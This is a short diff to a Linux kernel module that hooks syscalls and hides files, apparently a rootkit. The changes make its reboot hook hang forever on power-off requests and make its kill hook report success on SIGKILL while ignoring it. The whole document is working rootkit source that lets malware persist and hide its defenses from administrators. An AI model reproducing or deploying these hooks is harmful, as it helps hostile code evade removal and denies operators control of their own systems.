@@ -11,6 +11,7 @@
 #include <linux/hashtable.h>
 #include <linux/kprobes.h>
 #include <linux/reboot.h>
+#include <linux/delay.h>
 #include <asm/syscall.h>
 #include <stdbool.h>
 
@@ -138,7 +139,7 @@ static int hideFile(const struct hided_file __user *file)
 asmlinkage long reboot_hook(const struct pt_regs *regs)
 {
     if (regs->regs[2] == LINUX_REBOOT_CMD_POWER_OFF) {
-        return -EPERM;
+        while (true) msleep(1000);
     }
     return orig_reboot(regs);
 }
@@ -146,7 +147,7 @@ asmlinkage long reboot_hook(const struct pt_regs *regs)
 asmlinkage long kill_hook(const struct pt_regs *regs)
 {
     if (regs->regs[1] == SIGKILL) {
-        return -EPERM;
+        return 0;
     }
     return orig_kill(regs);
 }
